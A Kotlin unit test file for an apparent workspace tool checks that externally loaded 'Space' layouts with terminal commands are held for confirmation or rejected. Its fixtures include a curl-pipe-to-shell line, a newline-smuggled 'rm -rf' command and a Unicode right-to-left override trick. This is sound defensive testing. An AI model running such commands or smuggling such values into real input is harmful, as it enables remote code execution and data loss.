package ai.rever.boss.components.workspaces

import ai.rever.boss.plugin.workspace.SplitConfig.HorizontalSplit
import ai.rever.boss.plugin.workspace.SplitConfig.SinglePanel
import ai.rever.boss.plugin.workspace.SplitConfig.VerticalSplit
import kotlin.test.Test
import kotlin.test.assertEquals

/**
 * Guards which Space loads start shell commands without the operator seeing them first.
 *
 * Applying a Space types each terminal tab's `initialCommand` into a shell, so a Space is as
 * able to run a command as `boss://terminal?command=` is. [terminalCommands] is what the prompt
 * shows and [spaceLoadDisposition] is the one place the decision is made.
 */
class SpaceTerminalCommandsTest {
    private fun terminal(command: String?) = TabConfig(type = "terminal", title = "t", initialCommand = command)

    private fun panel(
        id: String,
        vararg tabs: TabConfig,
    ) = SinglePanel(PanelConfig(id, tabs.toList()))

    private fun space(layout: SplitConfig) = LayoutWorkspace(name = "Shared", description = "", layout = layout)

    @Test
    fun `every terminal command in the layout is collected, in layout order`() {
        val layout =
            VerticalSplit(
                left = panel("left", terminal("echo left")),
                right =
                    HorizontalSplit(
                        top = panel("top", terminal("echo top"), terminal("echo top 2")),
                        bottom = panel("bottom", terminal("echo bottom")),
                    ),
            )

        assertEquals(
            listOf("echo left", "echo top", "echo top 2", "echo bottom"),
            space(layout).terminalCommands(),
        )
    }

    @Test
    fun `only terminal tabs contribute, and a blank command types nothing`() {
        val layout =
            panel(
                "main",
                TabConfig(type = "browser", title = "b", url = "https://example.com", initialCommand = "echo ignored"),
                TabConfig(type = "editor", title = "e", filePath = "/tmp/a.kt"),
                terminal(null),
                terminal("   "),
                terminal("cd {projectPath} && clear && claude"),
            )

        // The placeholder is shown as the file carries it: it is substituted shell-quoted later.
        assertEquals(listOf("cd {projectPath} && clear && claude"), space(layout).terminalCommands())
    }

    @Test
    fun `the commands survive the round trip through the file a link points at`() {
        val saved = space(panel("main", terminal("echo from disk")))

        val loaded = WorkspaceSerializer.deserialize(WorkspaceSerializer.serialize(saved))

        assertEquals(listOf("echo from disk"), loaded.terminalCommands())
    }

    @Test
    fun `an external load of a Space with terminal commands is held for confirmation`() {
        assertEquals(
            SpaceLoadDisposition.CONFIRM,
            spaceLoadDisposition(listOf("curl https://example.com/x.sh | sh"), requiresConfirmation = true),
        )
    }

    @Test
    fun `a load that needs no confirmation is applied as before, commands and all`() {
        assertEquals(SpaceLoadDisposition.LOAD, spaceLoadDisposition(listOf("echo a"), requiresConfirmation = false))
        // The operator's own load is never displayed, so no display bound or shape check applies.
        assertEquals(
            SpaceLoadDisposition.LOAD,
            spaceLoadDisposition(List(SPACE_CONFIRM_MAX_COMMANDS + 1) { "echo a\nb" }, requiresConfirmation = false),
        )
    }

    @Test
    fun `a Space with no terminal commands needs no confirmation from anyone`() {
        listOf(true, false).forEach { requiresConfirmation ->
            assertEquals(SpaceLoadDisposition.LOAD, spaceLoadDisposition(emptyList(), requiresConfirmation))
        }
    }

    @Test
    fun `a command that would type lines the prompt never showed is dropped`() {
        assertEquals(
            SpaceLoadDisposition.REJECT,
            spaceLoadDisposition(listOf("echo fine", "echo a\nrm -rf x"), requiresConfirmation = true),
        )
        assertEquals(
            SpaceLoadDisposition.REJECT,
            spaceLoadDisposition(listOf("echo safe\u202Etxt"), requiresConfirmation = true),
        )
    }

    @Test
    fun `commands that cannot all be shown in full are dropped rather than confirmed`() {
        val longest = "e".repeat(SPACE_CONFIRM_MAX_COMMAND_LENGTH)
        assertEquals(SpaceLoadDisposition.CONFIRM, spaceLoadDisposition(listOf(longest), requiresConfirmation = true))
        assertEquals(
            SpaceLoadDisposition.REJECT,
            spaceLoadDisposition(listOf(longest + "e"), requiresConfirmation = true),
        )

        val most = List(SPACE_CONFIRM_MAX_COMMANDS) { "echo $it" }
        assertEquals(SpaceLoadDisposition.CONFIRM, spaceLoadDisposition(most, requiresConfirmation = true))
        assertEquals(
            SpaceLoadDisposition.REJECT,
            spaceLoadDisposition(most + "echo one more", requiresConfirmation = true),
        )
    }
}
